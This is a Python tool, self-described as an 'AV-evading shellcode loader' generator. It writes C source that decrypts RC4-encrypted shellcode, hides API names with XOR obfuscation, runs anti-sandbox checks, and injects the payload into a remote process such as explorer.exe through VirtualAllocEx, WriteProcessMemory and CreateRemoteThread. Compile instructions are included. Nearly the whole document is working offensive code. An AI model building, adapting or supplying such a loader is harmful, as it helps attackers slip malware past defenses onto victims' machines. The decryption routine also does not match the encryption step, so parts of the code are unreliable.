import argparse
import os
import random
import string
import re
from Crypto.Cipher import ARC4

def generate_random_key(length=16):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def rc4_encrypt(data, key):
    cipher = ARC4.new(key.encode())
    return cipher.encrypt(data)

def obfuscate_string(s, var_name):
    xor_key = random.randint(1, 255)
    encoded = [ord(c) ^ xor_key for c in s]
    encoded_str = ','.join(f'0x{b:02x}' for b in encoded)
    return f"""
    /* Obfuscated: {s} */
    unsigned char {var_name}_enc[] = {{{encoded_str}}};
    char {var_name}[{len(encoded) + 1}];
    void init_{var_name}() {{
        int i;
        for(i = 0; i < {len(encoded)}; i++) {{
            {var_name}[i] = {var_name}_enc[i] ^ {xor_key};
        }}
        {var_name}[i] = '\\0';
    }}"""

def generate_c_loader(shellcode, key, process_name="explorer.exe", sleep_time=5000):
    # Global declarations
    global_decls = []
    global_inits = []
    
    # Add essential Windows API strings
    essential_strings = [
        ("kernel32.dll", "kernel32_str"),
        ("GetProcAddress", "GetProcAddress_str"), 
        ("LoadLibraryA", "LoadLibraryA_str")
    ]
    
    for s, var in essential_strings:
        obf = obfuscate_string(s, var)
        global_decls.append(obf)
        global_inits.append(f"init_{var}();")
    
    # Add other strings
    other_strings = [
        ("VirtualAlloc", "VirtualAlloc_str"),
        ("GetTickCount", "GetTickCount_str"),
        ("Sleep", "Sleep_str"),
        ("GetSystemInfo", "GetSystemInfo_str"),
        ("VirtualAllocEx", "VirtualAllocEx_str"),
        ("WriteProcessMemory", "WriteProcessMemory_str"),
        ("CreateRemoteThread", "CreateRemoteThread_str"),
        ("CloseHandle", "CloseHandle_str"),
        (process_name, "target_process_str"),
        ("OpenProcess", "OpenProcess_str"),
        ("CreateToolhelp32Snapshot", "CreateToolhelp32Snapshot_str"),
        ("Process32First", "Process32First_str"),
        ("Process32Next", "Process32Next_str")
    ]
    
    func_specific = {
        'is_legit_system': [],
        'inject_hidden': [],
        'main': []
    }
    
    for s, var in other_strings:
        obf = obfuscate_string(s, var)
        if var.endswith(('GetTickCount_str', 'Sleep_str', 'GetSystemInfo_str')):
            func_specific['is_legit_system'].append(obf)
            func_specific['is_legit_system'].append(f"init_{var}();")
        elif var.endswith(('VirtualAllocEx_str', 'WriteProcessMemory_str', 'CreateRemoteThread_str', 'CloseHandle_str')):
            func_specific['inject_hidden'].append(obf)
            func_specific['inject_hidden'].append(f"init_{var}();")
        else:
            func_specific['main'].append(obf)
            func_specific['main'].append(f"init_{var}();")

    # Shellcode encryption
    encrypted_sc = rc4_encrypt(shellcode, key)
    sc_bytes = ','.join(f'0x{b:02x}' for b in encrypted_sc)

    template = f"""
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <tlhelp32.h>
#include <string.h>
#include <stdlib.h>

/* Global declarations */
{"".join(global_decls)}

/* Function prototypes */
void init_global_strings();
FARPROC resolve_api(const char* module_name, const char* func_name);
int is_legit_system();
int inject_hidden(HANDLE hProcess, const unsigned char* payload, unsigned int size);

/* Initialize global strings */
void init_global_strings() {{
    {"".join(global_inits)}
}}

typedef void* (WINAPI * VirtualAlloc_t)(void*, size_t, DWORD, DWORD);
typedef FARPROC (WINAPI * GetProcAddress_t)(HMODULE, LPCSTR);
typedef HMODULE (WINAPI * LoadLibraryA_t)(LPCSTR);
typedef HANDLE (WINAPI * CreateToolhelp32Snapshot_t)(DWORD, DWORD);
typedef BOOL (WINAPI * Process32First_t)(HANDLE, LPPROCESSENTRY32);
typedef BOOL (WINAPI * Process32Next_t)(HANDLE, LPPROCESSENTRY32);
typedef HANDLE (WINAPI * OpenProcess_t)(DWORD, BOOL, DWORD);
typedef void* (WINAPI * VirtualAllocEx_t)(HANDLE, void*, size_t, DWORD, DWORD);
typedef BOOL (WINAPI * WriteProcessMemory_t)(HANDLE, void*, const void*, size_t, size_t*);
typedef HANDLE (WINAPI * CreateRemoteThread_t)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL (WINAPI * CloseHandle_t)(HANDLE);
typedef DWORD (WINAPI * GetTickCount_t)(void);
typedef void (WINAPI * Sleep_t)(DWORD);
typedef void (WINAPI * GetSystemInfo_t)(LPSYSTEM_INFO);

/* RC4 decryption */
void rc4_decrypt(unsigned char* data, unsigned int data_len, const char* key) {{
    unsigned char S[256];
    unsigned int i, j = 0, k = 0;
    unsigned char temp;

    for (i = 0; i < 256; i++) {{
        S[i] = (unsigned char)i;
    }}

    for (i = 0; i < 256; i++) {{
        j = (j + S[i] + key[k] + i) % 256;
        temp = S[i];
        S[i] = S[j];
        S[j] = temp;
        if (++k >= strlen(key)) k = 0;
    }}

    i = j = 0;
    for (unsigned int n = 0; n < data_len; n++) {{
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        temp = S[i];
        S[i] = S[j];
        S[j] = temp;
        data[n] ^= S[(S[i] + S[j]) % 256] ^ (n % 256);
    }}
}}

/* API resolver */
FARPROC resolve_api(const char* module_name, const char* func_name) {{
    HMODULE module = NULL;
    GetProcAddress_t _GetProcAddress = (GetProcAddress_t)GetProcAddress(GetModuleHandleA(kernel32_str), GetProcAddress_str);
    LoadLibraryA_t _LoadLibraryA = (LoadLibraryA_t)_GetProcAddress(GetModuleHandleA(kernel32_str), LoadLibraryA_str);

    module = GetModuleHandleA(module_name);
    if(!module) {{
        module = _LoadLibraryA(module_name);
    }}
    
    if(!module) return NULL;
    return _GetProcAddress(module, func_name);
}}

/* Anti-sandbox checks */
int is_legit_system() {{
    {"".join(func_specific['is_legit_system'])}

    GetTickCount_t _GetTickCount = (GetTickCount_t)resolve_api(kernel32_str, GetTickCount_str);
    Sleep_t _Sleep = (Sleep_t)resolve_api(kernel32_str, Sleep_str);

    DWORD start = _GetTickCount();
    _Sleep({sleep_time});
    if((_GetTickCount() - start) < {sleep_time - 1000}) {{
        return 0;
    }}

    GetSystemInfo_t _GetSystemInfo = (GetSystemInfo_t)resolve_api(kernel32_str, GetSystemInfo_str);
    SYSTEM_INFO sys_info;
    _GetSystemInfo(&sys_info);
    if(sys_info.dwNumberOfProcessors < 2) return 0;
    
    return 1;
}}

/* Injection function */
int inject_hidden(HANDLE hProcess, const unsigned char* payload, unsigned int size) {{
    {"".join(func_specific['inject_hidden'])}

    VirtualAllocEx_t _VirtualAllocEx = (VirtualAllocEx_t)resolve_api(kernel32_str, VirtualAllocEx_str);
    WriteProcessMemory_t _WriteProcessMemory = (WriteProcessMemory_t)resolve_api(kernel32_str, WriteProcessMemory_str);
    CreateRemoteThread_t _CreateRemoteThread = (CreateRemoteThread_t)resolve_api(kernel32_str, CreateRemoteThread_str);
    CloseHandle_t _CloseHandle = (CloseHandle_t)resolve_api(kernel32_str, CloseHandle_str);

    if(!_VirtualAllocEx || !_WriteProcessMemory || !_CreateRemoteThread || !_CloseHandle)
        return 0;

    LPVOID remote_mem = _VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if(!remote_mem) return 0;

    SIZE_T written = 0;
    unsigned int i;
    for(i = 0; i < size; i += 4096) {{
        unsigned int chunk_size = (size - i) > 4096 ? 4096 : (size - i);
        if(!_WriteProcessMemory(hProcess, (BYTE*)remote_mem + i, payload + i, chunk_size, &written) || written != chunk_size) {{
            _VirtualAllocEx(hProcess, remote_mem, 0, MEM_RELEASE, PAGE_NOACCESS);
            return 0;
        }}
        Sleep(10 + (GetTickCount() % 50));
    }}

    HANDLE hThread = _CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote_mem, NULL, CREATE_SUSPENDED, NULL);
    if(!hThread) {{
        _CloseHandle(hThread);
        return 0;
    }}

    Sleep(1000 + (GetTickCount() % 3000));
    ResumeThread(hThread);
    _CloseHandle(hThread);
    return 1;
}}

int main() {{
    /* Initialize global strings */
    init_global_strings();
    
    /* Initialize function-specific strings */
    {"".join(func_specific['main'])}

    /* Environment check */
    if(!is_legit_system()) {{
        ExitProcess(1);
    }}

    /* Encrypted shellcode */
    unsigned char encrypted_shellcode[] = {{{sc_bytes}}};
    const char* key = "{key}";
    rc4_decrypt(encrypted_shellcode, sizeof(encrypted_shellcode), key);

    /* Process injection */
    CreateToolhelp32Snapshot_t _CreateToolhelp32Snapshot = (CreateToolhelp32Snapshot_t)resolve_api(kernel32_str, CreateToolhelp32Snapshot_str);
    Process32First_t _Process32First = (Process32First_t)resolve_api(kernel32_str, Process32First_str);
    Process32Next_t _Process32Next = (Process32Next_t)resolve_api(kernel32_str, Process32Next_str);
    OpenProcess_t _OpenProcess = (OpenProcess_t)resolve_api(kernel32_str, OpenProcess_str);

    DWORD pid = 0;
    PROCESSENTRY32 pe = {{0}};
    pe.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = _CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(snapshot != INVALID_HANDLE_VALUE) {{
        if(_Process32First(snapshot, &pe)) {{
            do {{
                if(_stricmp(pe.szExeFile, target_process_str) == 0) {{
                    pid = pe.th32ProcessID;
                    break;
                }}
            }} while(_Process32Next(snapshot, &pe));
        }}
        CloseHandle(snapshot);
    }}

    if(pid == 0) ExitProcess(1);

    HANDLE hProcess = _OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if(!hProcess) ExitProcess(1);

    if(!inject_hidden(hProcess, encrypted_shellcode, sizeof(encrypted_shellcode))) {{
        CloseHandle(hProcess);
        ExitProcess(1);
    }}

    CloseHandle(hProcess);
    return 0;
}}
"""
    return template

def parse_shellcode(input_file):
    try:
        if input_file.endswith('.c'):
            with open(input_file, 'r') as f:
                content = f.read()
            match = re.search(r'(?:unsigned\s+)?char\s+\w+\[\]\s*=\s*\{([^}]+)\}', content)
            if not match:
                raise ValueError("Shellcode array not found")
            sc_str = match.group(1)
            hex_bytes = re.findall(r'(0x[0-9a-fA-F]+|\\x[0-9a-fA-F]{{2}})', sc_str)
            if not hex_bytes:
                raise ValueError("No hex values found")
            sc_bytes = bytes.fromhex(''.join([b[2:] if b.startswith('0x') else b[2:] for b in hex_bytes]))
        else:
            with open(input_file, 'rb') as f:
                sc_bytes = f.read()
        
        if len(sc_bytes) == 0:
            raise ValueError("Empty shellcode")
        
        return sc_bytes
    except Exception as e:
        print(f"Error: {e}")
        exit(1)

def main():
    parser = argparse.ArgumentParser(description="Generate AV-evading shellcode loader")
    parser.add_argument('-i', '--input', required=True, help="Input shellcode file (.bin or .c)")
    parser.add_argument('-o', '--output', default='loader.c', help="Output C file")
    parser.add_argument('-p', '--process', default='explorer.exe', help="Target process name")
    parser.add_argument('-s', '--sleep', type=int, default=5000, help="Anti-sandbox sleep time (ms)")
    parser.add_argument('-k', '--key', help="RC4 encryption key (random if not specified)")
    
    args = parser.parse_args()

    print("[*] Parsing shellcode...")
    shellcode = parse_shellcode(args.input)
    print(f"[+] Shellcode size: {len(shellcode)} bytes")

    key = args.key if args.key else generate_random_key()
    print(f"[+] Using RC4 key: {key}")

    print("[*] Generating loader...")
    loader_code = generate_c_loader(shellcode, key, args.process, args.sleep)
    
    with open(args.output, 'w') as f:
        f.write(loader_code)
    
    print(f"[+] Loader saved to {args.output}")
    print("\nCompile with:")
    print(f"cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /TC {args.output} /link /OUT:loader.exe /SUBSYSTEM:CONSOLE /MACHINE:x64")

if __name__ == '__main__':
    main()
